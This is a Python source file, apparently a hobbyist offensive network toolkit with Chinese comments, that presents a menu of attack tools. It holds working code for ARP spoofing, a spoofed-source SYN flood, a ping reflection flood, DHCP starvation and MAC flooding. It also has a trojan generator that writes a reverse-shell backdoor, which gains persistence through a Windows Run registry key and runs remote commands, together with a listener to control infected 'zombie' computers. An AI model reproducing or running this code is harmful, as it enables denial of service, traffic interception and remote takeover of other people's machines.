#The program must be run in utf-8. 必须以UTF-8编码运行程序。
import time
tick = time.time()
try:
    from scapy.all import *#要用的模块有scapy没有就在命令行跑这条命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy
    from scapy.utils import PcapReader, PcapWriter
except:
    print("你是不是忘了安装scapy模块")
    print("scapy安装命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    import nmap
except:
    print("你是不是忘了安装python-nmap模块")
    print("请先在nmap的官网下载nmap www.nmap.org")
    print("如何执行指令windows:python -m pip install python-nmap liunx:sudo python -m pip install python-nmap")
    import sys
    input("按回车退出")
    sys.exit(0)
import random, sys, uuid, os#导入需要的自带模块
import socket as sk

print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
print("必须以UTF-8编码运行程序")
print("所有模块都可以按ctrl + c 退出")#为什么还有人不知道ctrl + c的神奇组合

mac=uuid.UUID(int = uuid.getnode()).hex[-12:]#获取本机MAC地址
mac = ":".join([mac[e:e+2] for e in range(0,11,2)])
print(mac)

file = open("color.setting",'r')#让用户可以选择程序运行时的颜色
color = file.read()#读取文件
os.system("color " + color)#用os.system()改变颜色

print("                                   /$$                  /$$    /$$$$$$    /$$    /$$$$$$ ")
print("                                  | $$                /$$$$   /$$__  $$ /$$$$   /$$__  $$")
print("/$$$$$$/$$$$   /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$|_  $$  | $$  \__/|_  $$  | $$  \__/ ")
print("| $$_  $$_  $$ |____  $$ /$$__  $$| $$  /$$/ /$$__  $$ | $$  | $$$$$$$   | $$  | $$$$$$$ ")
print("| $$ \ $$ \ $$  /$$$$$$$| $$  \__/| $$$$$$/ | $$  \ $$ | $$  | $$__  $$  | $$  | $$__  $$")
print("| $$ | $$ | $$ /$$__  $$| $$      | $$_  $$ | $$  | $$ | $$  | $$  \ $$  | $$  | $$  \ $$")
print("| $$ | $$ | $$|  $$$$$$$| $$      | $$ \  $$|  $$$$$$//$$$$$$|  $$$$$$/ /$$$$$$|  $$$$$$/")
print("|__/ |__/ |__/ \_______/|__/      |__/  \__/ \______/|______/ \______/ |______/ \______/ ")
print("+-------------------------------------+------------------------+")
print("|  MEN                                |  STR                   |")
print("+-------------------------------------+------------------------+")
print("|   0x000189abaa                      |         MOV 267 ACC    |")
print("|   0x000189abab                      |         PYTHON         |")
print("+-------------------------------------+------------------------+")
print("|             github:www.github.com/marko1616                  |")
print("+--------------------------------------------------------------+")
print("|          bilibili:space.bilibili.com/385353604               |")
print("+--------------------------------------------------------------+")

print("loding plugins...")

plugins_list = []
plugins_dir = os.path.join(os.getcwd() + '/plugins')
sys.path.append(os.getcwd() + '/plugins')

for (dirpath, dirnames, filenames) in os.walk(plugins_dir):
    for plugins_name in filenames:
        if os.path.splitext(plugins_name)[1] == '.py':
            exec("import " + os.path.splitext(plugins_name)[0])
            print("import " + os.path.splitext(plugins_name)[0] + "...Done")
            plugins_list.append(os.path.splitext(plugins_name)[0])

print("plugins loding...Done")
print("password list loding...")

password_list = []
file = open('pass.txt','r')
for i in file:
    password_list.append(i)
file.close()

print("password list read...Done")

def ARP_poof_with_not_ARPping():#ARP欺骗不带ARPPing
    
    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
    router = input("Please enter the router IP address like 192.168.1.1:")

    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
    packet_two = Ether()/ARP(psrc=target,pdst=router)

    while True:#攻击主循环
        try:
            sendp(packet)
            sendp(packet_two)
        except KeyboardInterrupt:
            break

def ARP_poof(): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活

    target = input("Enter the target IP like 127.0.0.1:")#目标输入不用我多说把。
    router = input("Please enter the router IP address like 192.168.1.1:")

    arp_Ping_fall = False#初始化变量
    arp_test = False
    arp_test_two = False

    print("Try to arpPing the target...")
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
    for snd,rcv in ans:
        print("arpPing...Done")
        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
        arp_test = True

    print("Try to arpPing the router...")
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
    for snd,rcv in ans:
        print("arpPing...Done")
        print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
        arp_test_two = True

    if arp_test == False or arp_test_two == False:
        arp_Ping_fall = True
        print("ARP ping fall.")

    packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
    packet_two = Ether()/ARP(psrc=target,pdst=router)

    while True:#攻击主循环
        try:
            if arp_Ping_fall:
                break
            sendp(packet)
            sendp(packet_two)
        except KeyboardInterrupt:
            break

def SYN_flood(): #SYN flood attack SYN洪水不用我说把
    target = input("Enter the target IP like 127.0.0.1:")#必须有的目标输入。
    port = input("enter port:")#攻击端口

    while True:#攻击主循环
        try:#一个ctrl + c退出模块自己体会
            send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"))#生成&发送攻击数据包
        except KeyboardInterrupt:
            break

def nmap_port_scan():#nmap扫描所有端口状态
    target = input("Enter the target IP like 127.0.0.1:")
    nm = nmap.PortScanner()
    tick = time.time()
    nm.scan(target, '1-9999')
    print("scan in ", time.time() - tick, "seconds.")
    for host in nm.all_hosts():#在nmap的扫描结果里的所有主机进行分析
        print('-----------------------------------')
        print('Host:%s(%s)'%(host,nm[host].hostname()))#打印计算机名称
        print('State:%s'%nm[host].state())
        for proto in nm[host].all_protocols():
            print('-----------------------------------')
            print('Protocol:%s'%proto)
            lport = list(nm[host][proto].keys())
            for port in lport:
                print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))

def DHCP_flood():
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(options=[("message-type","discover"),"end"])
    while True:
        try:
            srp(packet)
            time.sleep(1)
        except KeyboardInterrupt:
            break

def death_ping():
    target = input("Enter the target like 127.0.0.1:")
    while True:
        send(IP(src=target,dst=RandIP())/ICMP())

def scapy_sniff():
    file = open('iface.setting','r')
    iface = file.read()
    file.close()

    if iface == 'None':
        data = sniff(prn=lambda x:x.summary())#scapy的sniff嗅探
    else:
        data = sniff(iface=iface,prn=lambda x:x.summary())

    print("Start analyzing packets...")
    file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
    writer = PcapWriter(file, append = True)
    for i in data:
        writer.write(i)
    writer.flush()
    writer.close()

def read_pcap():

    file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
    file_name = "sniff_data/" + file_name#组合文件路径
    reader = PcapReader(file_name)#用scapy打开pcap文件
    packets = reader.read_all(-1)#读取所有储存的数据包
    for i in packets:#循环数据包列表
        i.show()#打印数据包

def macof():
    while True:
        try:
            packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
            time.sleep(0.01)
            sendp(packet)
        except KeyboardInterrupt:
            break

def Generate_trojan_virus():
    name = input("Enter virus name:")
    lhost = input("Enter connect host:")
    lport = input("Enter connect port:")
    file = open("virus/" + name + ".py",'w')
    file.write('import socket, os, time\n')
    file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')
    file.write('s = socket.socket()\n')
    file.write('s.connect(("' + lhost + '",' + lport + '))\n')
    file.write('while True:\n')
    file.write('    command = s.recv(2048)\n')
    file.write('    data = os.popen(command.decode("utf-8")).read()\n')
    file.write('    if data == "":\n')
    file.write('        data = "command has no output or has a error."\n')
    file.write('    s.send(bytes(data,encoding="utf-8"))\n')
    file.close()
    os.system("pyinstaller -F virus/" + name + ".py")

def countrol_zombie_computer():
    listen_host = input("Enter the listen host ip like 127.0.0.1:")
    listen_port = input("Enter the listen port like 80:")
    s = socket.socket()
    s.bind((listen_host,int(listen_port)))
    s.listen(1)
    print("Wait for connect...")
    conn,address = s.accept()
    print("have a new connect from",address[0])
    while True:
        command = input("Enter the command:")
        conn.send(bytes(command,encoding="utf-8"))
        data = conn.recv(4096)
        print(data.decode("utf-8"))

def Brute_force_mysql_password():
    pass

print("Setup in ", time.time() - tick, "seconds.")#初始化计时
while True:#喜闻乐见的主循环
    tool_number = 12

    print("如果要选择插件请输入插件名字")
    print("quit(0)")#告诉用户对应的功能
    print("ARPspoof with ARPPing.(1)")
    print("SYN flood(2)")
    print("All port status scans(3)")
    print("Death of Ping(4)")
    print("Sniff(5)")
    print("Read Save pcap file(6)")
    print("ARPspoof with not ARPPing(7)")
    print("macof(8)")
    print("DHCP flood(9)")
    print("Generate trojan virus(10)")
    print("Control zombie computer(11)")
    print("退出(0)")
    print("ARP欺骗带ARPPing(内网用)。(1)")
    print("SYN洪水(2)")
    print("所有端口状态扫描(3)")
    print("死亡之Ping(4)")
    print("sniff嗅探(5)")
    print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
    print("ARP欺骗不带ARPPing版(7)")
    print("伪macof(8)")
    print("DHCP洪水(9)")
    print("生成木马病毒(10)")
    print("控制肉鸡(11)")
    print("------------------pulgins-------------------")
    for i in plugins_list:
        print(i + "(" + str(tool_number) + ")")
        tool_number = tool_number + 1

    choose = input(">>>")#用户选择输入

    try:#判断用户输入的是否是数字
        choose = int(choose)#用int函数强转数字
    except:#如果不是就告诉用户必须输入数字
        print("Must enter int")

    if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
        sys.exit(0)
    elif choose == 1:#时刻提醒自己要两的等于号。
        ARP_poof()
    elif choose == 2:#没一个选择对应一个函数
        SYN_flood()
    elif choose == 3:
        nmap_port_scan()
    elif choose == 4:
        death_ping()
    elif choose == 5:
        scapy_sniff()
    elif choose == 6:
        read_pcap()
    elif choose == 7:
        ARP_poof_with_not_ARPping()
    elif choose == 8:
        macof()
    elif choose == 9:
        DHCP_flood()
    elif choose == 10:
        Generate_trojan_virus()
    elif choose == 11:
        countrol_zombie_computer()
    for i in plugins_list:
        if choose == i:
            exec(i + ".run()")
